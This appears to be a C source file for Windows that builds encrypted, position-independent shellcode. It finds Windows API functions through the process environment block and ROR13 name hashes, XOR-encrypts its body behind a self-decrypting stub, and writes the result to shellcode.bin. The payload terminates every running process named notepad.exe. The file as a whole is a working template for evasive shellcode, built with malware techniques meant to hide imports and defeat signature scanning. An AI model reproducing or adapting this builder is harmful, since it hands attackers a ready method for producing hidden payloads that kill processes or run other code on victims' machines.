#define _CRT_SECURE_NO_WARNINGS


#include <ws2tcpip.h>
#include <winternl.h>

#include <wchar.h>
#include <tlhelp32.h>
#include <stdio.h>

#include <windows.h>
#include <process.h>

#include <winbase.h>
#include <string.h>

#define KERNEL32_HASH 0x6E2BCA17 // KERNEL32.DLL
#define CREATEFILEA_HASH 0x7C0017A5 // CreateFileA (kernel32.dll)
#define WRITEFILE_HASH 0xE80A791F // WriteFile (kernel32.dll)
#define LOCALALLOC_HASH 0x4C0297FA // LocalAlloc (kernel32.dll)
#define GETPROCESSHEAP_HASH 0xA80EECAE // GetProcessHeap (kernel32.dll)
#define LOCALFREE_HASH 0x5CBAEAf6 // LocalFree (kernel32.dll)
#define EXITPROCESS_HASH 0x73E2D87E // ExitProcess (kernel32.dll)
#define LOADLIBRARY_HASH 0xEC0E4E8E // LoadLibraryA (kernel32.dll)
#define GETTCPTABLE_HASH 0xFAF48BAF // GetTcpTable (Iphlpapi.dll)
#define NTOHS_HASH 0xEB46FC33 // ntohs (Ws2_32.dll)
#define CREATETOOLHELP32SNAPSHOT_HASH 0xE454DFED
#define PROCESS32FIRST_HASH 0x3249BAA7 
#define PROCESS32NEXT_HASH 0x4776654A
#define OPENPROCESS_HASH 0xEFE297C0
#define CLOSEHANDLE_HASH 0xFFD97FB
#define TERMINATEPROCESS_HASH 0x78B5B983

#define XOR_KEY 0x15
#define FULL_SHELLCODE_SIZE 1600
#define SHELLCODE_DECRYPTION_PART_SIZE 80 - 18
#define ACTIVE_CODE_SIZE (FULL_SHELLCODE_SIZE - SHELLCODE_DECRYPTION_PART_SIZE)

void __stdcall shellcode_decrypt_entry();
void  shellcode_main();
void __stdcall swap(char* x, char* y);
char* __stdcall reverse(char* buffer, int i, int j);
char* __stdcall itoa_function(int value, char* buffer, int base);
int __stdcall prepare_number(char* number);
int __stdcall strcmp_func(const char* s1, const char* s2);
PPEB get_peb(void);
DWORD __stdcall unicode_ror13_hash(const WCHAR* unicode_string);
DWORD __stdcall ror13_hash(const char* string);
HMODULE __stdcall find_module_by_hash(DWORD hash);
FARPROC __stdcall find_function(HMODULE module, DWORD hash);
void __declspec() END_SHELLCODE(void);

void __stdcall shellcode_decrypt_entry()
{
	/* at first we need the address of the active code entry point */
	unsigned char* code_address;
	unsigned char* code_address_end;
	__asm
	{
		mov eax, ebp
		add ax, SHELLCODE_DECRYPTION_PART_SIZE
		add eax, 4
		mov code_address, eax
		add ax, (ACTIVE_CODE_SIZE + 36)
		mov code_address_end, eax
	}
	for (; code_address < code_address_end; code_address++)
	{
		*code_address = *code_address ^ XOR_KEY;
	}

	/* after decryption we can launch the active code of the shellcode */
	shellcode_main();
}

void  shellcode_main()
{
	
	char ProcToKillName_str[] = { 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e','\0'};
	HMODULE kernel32dll = find_module_by_hash(KERNEL32_HASH);
	FARPROC CreateToolhelp32Snapshot_by_hash = find_function(kernel32dll, CREATETOOLHELP32SNAPSHOT_HASH);
	FARPROC Process32First_by_hash = find_function(kernel32dll, PROCESS32FIRST_HASH);
	FARPROC Process32Next_by_hash = find_function(kernel32dll, PROCESS32NEXT_HASH);
	FARPROC OpenProcess_by_hash = find_function(kernel32dll, OPENPROCESS_HASH);
	FARPROC TerminateProcess_by_hash = find_function(kernel32dll, TERMINATEPROCESS_HASH);
	FARPROC CloseHandle_by_hash = find_function(kernel32dll, CLOSEHANDLE_HASH);
	FARPROC loadlibrarya = find_function(kernel32dll, LOADLIBRARY_HASH);
	FARPROC exitprocess = find_function(kernel32dll, EXITPROCESS_HASH);
	
	//printf("%d\n",1);
	HANDLE hSnapShot = CreateToolhelp32Snapshot_by_hash(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof (pEntry);
    BOOL hRes = Process32First_by_hash(hSnapShot, &pEntry);
	//printf("%d\n",2);
	
    while (hRes)
    {
		
        if (strcmp_func(pEntry.szExeFile, ProcToKillName_str) == 0)
        {
			//printf("%d\n",3);
            HANDLE hProcess = OpenProcess_by_hash(PROCESS_TERMINATE, 0,
                                          (DWORD) pEntry.th32ProcessID);
            if (hProcess != NULL)
            {
				//printf("%d\n",4);
                TerminateProcess_by_hash(hProcess, 9);
                CloseHandle_by_hash(hProcess);
            }
        }
        hRes = Process32Next_by_hash(hSnapShot, &pEntry);
    }
    CloseHandle_by_hash(hSnapShot);
	
	exitprocess(0);
}

// inline function to swap two numbers
void __stdcall swap(char* x, char* y)
{
	char t = *x; *x = *y; *y = t;
}

// function to reverse buffer[i..j]
char* __stdcall reverse(char* buffer, int i, int j)
{
	while (i < j)
		swap(&buffer[i++], &buffer[j--]);

	return buffer;
}

// Iterative function to implement itoa() function in C
char* __stdcall itoa_function(int value, char* buffer, int base)
{
	// invalid input
	if (base < 2 || base > 32)
		return buffer;

	// consider absolute value of number
	int n = value;
	if (n < 0)
	{
		n = -n;
	}

	int i = 0;
	while (n)
	{
		int r = n % base;

		if (r >= 10)
			buffer[i++] = 65 + (r - 10);
		else
			buffer[i++] = 48 + r;

		n = n / base;
	}

	// if number is 0
	if (i == 0)
		buffer[i++] = '0';

	// If base is 10 and value is negative, the resulting string 
	// is preceded with a minus sign (-)
	// With any other base, value is always considered unsigned
	if (value < 0 && base == 10)
		buffer[i++] = '-';

	buffer[i] = '\0'; // null terminate string

	// reverse the string and return it
	return reverse(buffer, 0, i - 1);
}


int __stdcall strcmp_func(const char* s1, const char* s2)
{
    while (*s1 && (*s1 == *s2))
        s1++, s2++;
    return *(const unsigned char*)s1 - *(const unsigned char*)s2;
}

int __stdcall prepare_number(char* number)
{
	int i = 0;
	while (number[i] != '\0')
	{
		i = i + 1;
	}

	int i_saved = i + 1;
	number[i] = ' ';
	number[i + 1] = '\0';
	return i_saved;
}

PPEB __declspec(naked) get_peb(void)
{
	__asm {
		mov eax, fs: [0x30]
		ret
	}
}

DWORD __stdcall unicode_ror13_hash(const WCHAR* unicode_string)
{
	DWORD hash = 0;

	while (*unicode_string != 0)
	{
		DWORD val = (DWORD)* unicode_string++;
		hash = (hash >> 13) | (hash << 19); // ROR 13
		hash += val;
	}
	return hash;
}

DWORD __stdcall ror13_hash(const char* string)
{
	DWORD hash = 0;

	while (*string) {
		DWORD val = (DWORD)* string++;
		hash = (hash >> 13) | (hash << 19);  // ROR 13
		hash += val;
	}
	return hash;
}

HMODULE __stdcall find_module_by_hash(DWORD hash)
{
	PPEB peb = NULL;
	LDR_DATA_TABLE_ENTRY* module_ptr = NULL, * first_mod = NULL;
	PLIST_ENTRY pListEntry = NULL;

	peb = get_peb();

	pListEntry = peb->Ldr->InMemoryOrderModuleList.Flink;
	module_ptr = (PLDR_DATA_TABLE_ENTRY)pListEntry;
	first_mod = module_ptr;

	do
	{
		if (module_ptr->FullDllName.Length != 0 &&
			unicode_ror13_hash((WCHAR*)module_ptr->FullDllName.Buffer) == hash)
		{
			return (HMODULE)module_ptr->Reserved2[0];
		}

		else
		{
			pListEntry = pListEntry->Flink;
			module_ptr = (PLDR_DATA_TABLE_ENTRY)pListEntry;
		}

	} while (module_ptr && module_ptr != first_mod);   // because the list wraps,

	return INVALID_HANDLE_VALUE;
}

FARPROC __stdcall find_function(HMODULE module, DWORD hash)
{
	IMAGE_DOS_HEADER* dos_header;
	IMAGE_NT_HEADERS* nt_headers;
	IMAGE_EXPORT_DIRECTORY* export_dir;
	DWORD* names, * funcs;
	WORD* nameords;
	unsigned i;

	dos_header = (IMAGE_DOS_HEADER*)module;
	nt_headers = (IMAGE_NT_HEADERS*)((char*)module + dos_header->e_lfanew);
	export_dir = (IMAGE_EXPORT_DIRECTORY*)((char*)module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	names = (DWORD*)((char*)module + export_dir->AddressOfNames);
	funcs = (DWORD*)((char*)module + export_dir->AddressOfFunctions);
	nameords = (WORD*)((char*)module + export_dir->AddressOfNameOrdinals);

	for (i = 0; i < export_dir->NumberOfNames; i++)
	{
		char* string = (char*)module + names[i];
		if (hash == ror13_hash(string))
		{
			WORD nameord = nameords[i];
			DWORD funcrva = funcs[nameord];
			return (FARPROC)((char*)module + funcrva);
		}
	}

	return NULL;
}

void __declspec(naked) END_SHELLCODE(void) {}

void find_xor_key()
{
	unsigned char checked_byte;
	unsigned char* byte_pointer;
	for (checked_byte = 0b00000001; checked_byte < 0b11111111; checked_byte++)
	{
		for (byte_pointer = (unsigned char*)shellcode_main; byte_pointer < (unsigned char*)END_SHELLCODE; byte_pointer++)
		{
			if (*byte_pointer == checked_byte)
			{
				printf("byte %x found in the active code\n", checked_byte);
				break;
			}
		}
	}

	return;
}

int main()
{
	printf("Shellcode starts at %p and is %d bytes long\n", shellcode_decrypt_entry, (int)END_SHELLCODE - (int)shellcode_decrypt_entry);
	printf("shellcode_decrypt_entry() starts at %p and is %d bytes long\n", shellcode_decrypt_entry, (int)shellcode_main - (int)shellcode_decrypt_entry);
    printf("%x\n", ror13_hash("CreateToolhelp32Snapshot"));
	printf("%x\n", ror13_hash("Process32First"));
	printf("%x\n", ror13_hash("Process32Next"));
	printf("%x\n", ror13_hash("OpenProcess"));
	printf("%x\n", ror13_hash("CloseHandle"));
	printf("%x\n", ror13_hash("TerminateProcess"));
	//shellcode_main();

	unsigned char shellcode_buffer[FULL_SHELLCODE_SIZE];
	
	
	int i;
	unsigned char* code_address;
	for (i = 0, code_address = (unsigned char*)shellcode_decrypt_entry; code_address < (unsigned char*)END_SHELLCODE; i++, code_address++)
	{
		shellcode_buffer[i] = *code_address;
	}

	// the size of shellcode_decrypt_entry() is 64 bytes. we must encrypt all shellcode except this function 
	for (i = SHELLCODE_DECRYPTION_PART_SIZE; i < FULL_SHELLCODE_SIZE; i++)
	{
		shellcode_buffer[i] = shellcode_buffer[i] ^ XOR_KEY;
	}

	// now, when the shellcode is encrypted except the shellcode_decrypt_entry(), we can write full shellcode into shellcode.bin 
	FILE* output_file = fopen("shellcode.bin", "wb");

	fwrite(shellcode_buffer, 1, FULL_SHELLCODE_SIZE, output_file);
	fclose(output_file);
	
	FILE* output_file_second = fopen("shellcode_noencryption.bin", "wb");
	fwrite(shellcode_decrypt_entry, (int)END_SHELLCODE - (int)shellcode_decrypt_entry, 1, output_file_second);
	fclose(output_file_second);

	
    
	return 0;
}